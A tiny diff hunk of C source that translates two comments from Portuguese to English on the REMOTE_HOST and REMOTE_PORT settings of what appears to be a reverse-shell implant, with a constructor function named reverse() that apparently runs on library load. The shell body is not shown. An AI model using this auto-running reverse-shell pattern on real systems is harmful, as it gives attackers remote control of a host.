@@ -6,8 +6,8 @@
 #include <netinet/in.h>
 #include <sys/types.h>
 
-#define REMOTE_HOST "127.0.0.1" // Adiciona o IP
-#define REMOTE_PORT 7070 // Adiciona a pora
+#define REMOTE_HOST "127.0.0.1" // Add IP
+#define REMOTE_PORT 7070 // Add port
 
 void __attribute__ ((constructor)) reverse()
 {
